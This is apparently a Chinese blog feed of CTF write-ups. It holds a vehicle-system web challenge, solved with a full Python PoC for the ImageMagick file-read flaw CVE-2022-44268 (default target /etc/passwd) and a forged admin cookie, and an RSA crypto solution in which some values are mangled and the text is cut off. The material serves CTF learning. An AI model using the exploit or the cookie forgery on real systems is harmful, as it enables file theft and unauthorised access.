      <title>[2023饶派杯车联网CTF]对访客开放的车载系统</title>
      <link href="/2023/05/31/447f6e529e9f-q1jun/"/>
      <url>/2023/05/31/447f6e529e9f-q1jun/</url>
      
        <content type="html"><![CDATA[<h3 id="0x01-题目："><a href="#0x01-题目：" class="headerlink" title="0x01 题目："></a>0x01 题目：</h3><p>对访客开放的车载系统，进入环境：<code>http://172.35.8.73/</code></p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20230531094745262.png" alt="image-20230531094745262"></p><h3 id="0x02-题解："><a href="#0x02-题解：" class="headerlink" title="0x02 题解："></a>0x02 题解：</h3><p>在登入页面使用字典跑一遍，发现<code>Guest</code>&#x2F;<code>Guest</code>可以登入：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20230531094915874.png" alt="image-20230531094915874"></p><p>进入后页面：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20230531094938097.png" alt="image-20230531094938097"></p><p>根据hint，涉及到的漏洞<code>CVE-2022-44268</code></p><p>利用代码如下：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> png</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line">logging.basicConfig(stream=sys.stderr, level=logging.INFO, <span class="built_in">format</span>=<span class="string">&#x27;%(asctime)s - %(levelname)s - %(message)s&#x27;</span>)</span><br><span class="line">d = zlib.decompressobj()</span><br><span class="line">e = zlib.compressobj()</span><br><span class="line">IHDR = <span class="string">b&#x27;\x00\x00\x00\n\x00\x00\x00\n\x08\x02\x00\x00\x00&#x27;</span></span><br><span class="line">IDAT = <span class="string">b&#x27;x\x9c\xbd\xcc\xa1\x11\xc0 \x0cF\xe1\xb4\x03D\x91\x8b`\xffm\x98\x010\x89\x01\xc5\x00\xfc\xb8\n\x8eV\xf6\xd9&#x27;</span> \</span><br><span class="line">       <span class="string">b&#x27;\xef\xee])%z\xef\xfe\xb0\x9f\xb8\xf7^J!\xa2Zkkm\xe7\x10\x02\x80\x9c\xf3\x9cSD\x0esU\x1dc\xa8\xeaa\x0e\xc0&#x27;</span> \</span><br><span class="line">       <span class="string">b&#x27;\xccb\x8cf\x06`gwgf\x11afw\x7fx\x01^K+F&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_data</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    _, data = data.strip().split(<span class="string">b&#x27;\n&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(data.replace(<span class="string">b&#x27;\n&#x27;</span>, <span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> binascii.unhexlify(data.replace(<span class="string">b&#x27;\n&#x27;</span>, <span class="string">b&#x27;&#x27;</span>)).decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">filename: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> filename:</span><br><span class="line">        logging.error(<span class="string">&#x27;you must specify a input filename&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    p = png.Reader(filename=filename)</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> p.chunks():</span><br><span class="line">        logging.info(<span class="string">&quot;chunk %s found, value = %r&quot;</span>, k.decode(), v)</span><br><span class="line">        <span class="keyword">if</span> k == <span class="string">b&#x27;zTXt&#x27;</span>:</span><br><span class="line">            name, data = v.split(<span class="string">b&#x27;\x00&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">            res = parse_data(d.decompress(data[<span class="number">1</span>:]))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> res:</span><br><span class="line">        sys.stdout.write(res)</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">from_filename, to_filename, read_filename</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> to_filename:</span><br><span class="line">        logging.error(<span class="string">&#x27;you must specify a output filename&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(to_filename, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(png.signature)</span><br><span class="line">        <span class="keyword">if</span> from_filename:</span><br><span class="line">            p = png.Reader(filename=from_filename)</span><br><span class="line">            <span class="keyword">for</span> k, v <span class="keyword">in</span> p.chunks():</span><br><span class="line">                <span class="keyword">if</span> k != <span class="string">b&#x27;IEND&#x27;</span>:</span><br><span class="line">                    png.write_chunk(f, k, v)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            png.write_chunk(f, <span class="string">b&#x27;IHDR&#x27;</span>, IHDR)</span><br><span class="line">            png.write_chunk(f, <span class="string">b&#x27;IDAT&#x27;</span>, IDAT)</span><br><span class="line"></span><br><span class="line">        png.write_chunk(f, <span class="string">b&quot;tEXt&quot;</span>, <span class="string">b&quot;profile\x00&quot;</span> + read_filename.encode())</span><br><span class="line">        png.write_chunk(f, <span class="string">b&#x27;IEND&#x27;</span>, <span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;POC for CVE-2022-44268&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;action&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, choices=(<span class="string">&#x27;generate&#x27;</span>, <span class="string">&#x27;parse&#x27;</span>))</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-i&#x27;</span>, <span class="string">&#x27;--input&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27;input filename&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-o&#x27;</span>, <span class="string">&#x27;--output&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27;output filename&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-r&#x27;</span>, <span class="string">&#x27;--read&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27;target file to read&#x27;</span>, default=<span class="string">&#x27;/etc/passwd&#x27;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    <span class="keyword">if</span> args.action == <span class="string">&#x27;generate&#x27;</span>:</span><br><span class="line">        write(args.<span class="built_in">input</span>, args.output, args.read)</span><br><span class="line">    <span class="keyword">elif</span> args.action == <span class="string">&#x27;parse&#x27;</span>:</span><br><span class="line">        read(args.<span class="built_in">input</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        logging.error(<span class="string">&quot;bad action&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用前记得安装一个<code>pypng</code>包安装代码如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install pypng</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pip install pypng</span><br></pre></td></tr></table></figure><p>先获取一下<code>index.php</code>使用指令如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./poc.py generate -o poc.png -r &#x27;./index.php&#x27;</span><br></pre></td></tr></table></figure><p>生成一个<code>poc.png</code>图片文件，然后上传到服务器，再右键图片下载下来，利用脚本进行解析：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./poc.py parse -i 6476fa0eb4cf4.png</span><br></pre></td></tr></table></figure><p>同理可以任意读取<code>user.php</code>、<code>upload.php</code>，但是在这个过程中遇到点bug：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20230531182809088.png" alt="image-20230531182809088"></p><p>这是由于代码中包含很多特殊字符，导致在处理图片文件时出现错误，这里进行修改，把对应的源数据用python的函数<code>bytes.fromhex()</code>进行解析，解析不了就去掉一些头或者尾</p><blockquote><p>可能是原作者在内容处理没有做过多的修饰（</p></blockquote><p>下面是通过任意读取获得的<code>user.php</code>内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">······（省略一坨无效代码</span><br><span class="line"><span class="meta">&lt;?php</span>\r\n    <span class="keyword">include</span>(<span class="string">&quot;function.php&quot;</span>);</span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;login_cookie&#x27;</span>];</span><br><span class="line"><span class="variable">$decodedCookie</span> = <span class="title function_ invoke__">myDecrypt</span>(<span class="variable">$cookie</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$decodedCookie</span> === <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">  <span class="variable">$isAdmin</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$isAdmin</span>) &#123;</span><br><span class="line">  <span class="variable">$content</span> = <span class="title function_ invoke__">system</span>(<span class="string">&quot;/readflag&quot;</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;&quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$content</span>) . <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125; \r\n    <span class="meta">?&gt;</span>\r\n&lt;/body&gt;\r\n&lt;/html&gt;\r\n<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>代码比较乱，但是可以在后面找到一个<code>include(&quot;function.php&quot;);</code>,并且有一个<code>myDecrypt()</code>函数，可以合理猜测获取flag关键的一步应该在<code>function.php</code>中。</p><p>继续上上面的步骤读取“function.php”，整理一下可以得到以下内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">myDecrypt</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$key</span>=<span class="string">&quot;hello&quot;</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$data</span>);</span><br><span class="line">    <span class="variable">$salt</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$key</span>), <span class="number">0</span>, <span class="number">8</span>); <span class="comment">//生成加密盐</span></span><br><span class="line">    <span class="variable">$iv</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$data</span>, <span class="number">0</span>, <span class="number">16</span>); <span class="comment">// 提取随机因素    </span></span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$data</span>, <span class="number">16</span>); <span class="comment">// 提取加密后的数据</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$data</span>, <span class="string">&#x27;AES-256-CBC&#x27;</span>, <span class="variable">$salt</span>.<span class="variable">$key</span>, OPENSSL_RAW_DATA, <span class="variable">$iv</span>); </span><br><span class="line">    <span class="comment">// 使用 AES-256 进行对称解密</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">str_rot13</span>(<span class="variable">$data</span>);</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$data</span>);</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">gzuncompress</span>(<span class="variable">$data</span>);</span><br><span class="line">    <span class="comment">//对字符串进行反变化</span></span><br><span class="line">    </span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">strrev</span>(<span class="variable">$data</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$data</span>; <span class="comment">//admin -&gt; 1dm3n</span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>可以发现这又是一个套娃解密，反过来写就行了，就是要注意一下<code>$data = substr($data, 16);</code>在加密函数中应该是<code>$data = $iv.$data;</code></p><p>最后得到的脚本应该是这样的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$key</span>=<span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="variable">$data</span> = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">strrev</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">gzcompress</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;\n1base:&quot;</span>.<span class="variable">$data</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">str_rot13</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;\n2rot:&quot;</span>.<span class="variable">$data</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="variable">$salt</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$key</span>), <span class="number">0</span>, <span class="number">8</span>); <span class="comment">//生成加密盐</span></span><br><span class="line"><span class="variable">$iv</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$data</span>, <span class="number">0</span>, <span class="number">16</span>); <span class="comment">// 提取随机因素</span></span><br><span class="line"><span class="comment">//$data = substr($data, 16); // 提取加密后的数据</span></span><br><span class="line"><span class="comment">//$data = &quot;a111111111111111&quot;.$data;</span></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">openssl_encrypt</span>(<span class="variable">$data</span>, <span class="string">&#x27;AES-256-CBC&#x27;</span>, <span class="variable">$salt</span>.<span class="variable">$key</span>, OPENSSL_RAW_DATA, <span class="variable">$iv</span>); </span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;\n3aes:&quot;</span>.<span class="variable">$data</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$iv</span>.<span class="variable">$data</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;\n4add:&quot;</span>.<span class="variable">$data</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;\n5result:&quot;</span>.<span class="variable">$data</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">myDecrypt</span>(<span class="variable">$data</span>));</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1base: eJzLM85NMQQABTcBpA==</span><br><span class="line"></span><br><span class="line">2rot: rWmYZ85AZDDNOGpOcN==</span><br><span class="line"></span><br><span class="line">3aes: ?6??!J??k?:????L??_g_y4???f-</span><br><span class="line"></span><br><span class="line">4add: rWmYZ85AZDDNOGpO?6??!J??k?:????L??_g_y4???f-</span><br><span class="line"></span><br><span class="line">5result: cldtWVo4NUFaREROT0dwT/c2hqsaIUrCxmsCpzoakpar40yNnV9nX3k0yeu17mYt</span><br><span class="line"></span><br><span class="line">admin</span><br></pre></td></tr></table></figure><p>把得到的result放到cookie中的<code>login_cookie</code>字段，访问<code>/user.php</code>就可以拿到flag了</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20230531224304860.png" alt="image-20230531224304860"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[青少年CTF]crypto-easyrsa2</title>
      <link href="/2023/01/30/79aab02db9cf-q1jun/"/>
      <url>/2023/01/30/79aab02db9cf-q1jun/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-题目"><a href="#0x01-题目" class="headerlink" title="0x01 题目"></a>0x01 题目</h2><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20230130225908304.png" alt="image-20230130225908304"></p><p>附件📎：attachment.rar</p><p>-&gt; rsa.py:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">flag=<span class="string">b&quot;qsnctf&#123;xxx&#125;&quot;</span></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p*q</span><br><span class="line">g = n+<span class="number">1</span></span><br><span class="line">m = bytes_to_long(flag+os.urandom(<span class="number">80</span>))</span><br><span class="line"><span class="keyword">assert</span> m &lt; n</span><br><span class="line">c=(<span class="built_in">pow</span>(g,p,n*n)*<span class="built_in">pow</span>(m,n,n*n))%(n*n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span>+<span class="built_in">str</span>(c))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span>+<span class="built_in">str</span>(n))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hint=&quot;</span>+<span class="built_in">str</span>(<span class="built_in">pow</span>(m,n,n*n)))</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">cspan></span><br><span class="line"><span class="string">n=9708240910053370327647790439860059395697433308093756873635851265001056001241814559377845391403869007592553831023273503888032698234970709669543334556062588508047041830328271866526501975789023731681405580485272835157565865576389655812958754783970253647199760653920473402313707835141798861179370897475214985631140985268832048996867332230888259485268845102594348768694808862929202235718025035375364452457226504332282661544721948483958933549896194659715546983203083340635396852388654958534328589664265477197863480536895984751045258639005062576375047487801340353952725037332762579311892566309845803551721154611198850694889</span></span><br><span class="line"><span class="string">hintspan></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="0x02-解题"><a href="#0x02-解题" class="headerlink" title="0x02 解题"></a>0x02 解题</h2><p>这个题目是公约数分解n的思路，不过推导起来还是有难度的</p><p>已知：<br>$$<br>\begin{array}{l}<br>h \equiv m^n \pmod {n^2} \\<br>c \equiv g^p \cdot m^n \pmod {n^2}<br>\end{array}<br>$$<br>将$g &#x3D; (n+1), h$代进去。2式变为:<br>$$<br>c \equiv (n+1)^p \cdot h \pmod {n^2}<br>$$<br>两边同时乘上$h$模$n^2$的逆元$h^{-1}$:<br>$$<br>c\cdot h^{-1} \equiv (n+1)^p \pmod {n^2}<br>$$<br>需要用到二项式定理。<br>$$<br>(a+b)^n &#x3D; \sum_{r&#x3D;0}^nC_n^ra^{n-r}b^r &#x3D; C_n^0a^n + C_n^1a^{n-1}b +\cdots + C_n^ra^{n-r}b^r + \cdots +C_n^nb^n<br>$$<br>使用二项式定理分解$(n+1)^p$<br>$$<br>(n+1)^p &#x3D; n^p + C_p^1n^{p-1} + C_p^2n^{p-2} + \cdots + C_p^{p-1}n + 1<br>$$<br>其中二项式的系数<br>$$<br>C_p^r &#x3D; \frac{p!}{r!(p-r)!} &#x3D; \frac{p\cdot (p-1)!}{r!(p-r)!}<br>$$<br>来重点看一下中间的项的系数，除了第一项和最后一项，其余的分子都是有一个$p$,</p><p>已知$p$是素数，$p $与小于$p$的数都互质。那么，所有分子上的p都无法被约分。</p><p>又知道$C_p^r$ 是整数，那么可以将$C_p^r &#x3D; k_rp$<br>$$<br>\begin{array}{l}<br>(n+1)^p &amp;&#x3D; 1 + n^p  + k_1pn^{p-1} + k_2pn^{p-2} + \cdots + k_{p-1}pn \\<br>&amp;&#x3D;1 + pq\cdot n^{p-1} + k_1pn^{p-1} + k_2pn^{p-2} + \cdots +  k_{p-1}pn \\<br>&amp;&#x3D;1 + kpn<br>\end{array}<br>$$<br>将结果代入：<br>$$<br>c\cdot h^{-1} &#x3D; 1 + k_1pn + k_2n^2<br>$$<br>将1移到左边<br>$$<br>c\cdot h^{-1} - 1 &#x3D; k_1pn + k_2pqn &#x3D;  pn(k_1 + k2_q) &#x3D; kpn<br>$$<br>最终得到<br>$$<br>\frac{c\cdot h^{-1}}{n} &#x3D; kp<br>$$<br>至此，终于找到了$kp$ 而等式左边都是已知，可以通过公约数分解$n$</p><p>另外还有一个点，加密指数是 $n $, 模数是$n^2 \varphi(n^2) &#x3D; p(p-1)q(q-1)&#x3D;n(p-1)(q-1)$</p><p>加密指数与$\varphi(n^2)$不互素，不能直接解，需要再变形一下。<br>$$<br>h &#x3D; m^n  + kn^2<br>$$<br>两边同时模n<br>$$<br>h \equiv m^n \pmod n<br>$$<br>最终的解题代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">c=<span class="number">66678676807819999233055752233012645216556361263550510641458138760242990544877153301370374578704777931232476338305467217987404530347735695779503178036421182225797342139667414033819549735400631841417480498297529049064697503015021854485122852781023739931626312344890150603219610361949715257299757876396121457922011100238200914884518816724570032960792393893693987273449132986383967737661332184245494679249768271219448311009053358014235996071771678629824838455550656184325379070682831449751581704335301991422979670164462996326062181802199457920952884644486857703150690485372324099739728933019077124979301630915161677329073838717624281912453064292050645599587914370539926494875189042257226901095428367557104603484361484689870742875976031491361356906065563995295161550794376980645647256180808032818970477137116813399005614665378240469106976942172004532499389709072629630182831176447909810194979470492503457826783215378012716067168240899950280919812526665449548435470763153364775037634608636124823419727610771754135029066786995448023344714433006189682986009642250012827276182380723006889497445191429315726319860246957758947479783856107618504793372727551573516430116044526115831580866712303531100607806086948676318637464591882028026021699894</span></span><br><span class="line">n=<span 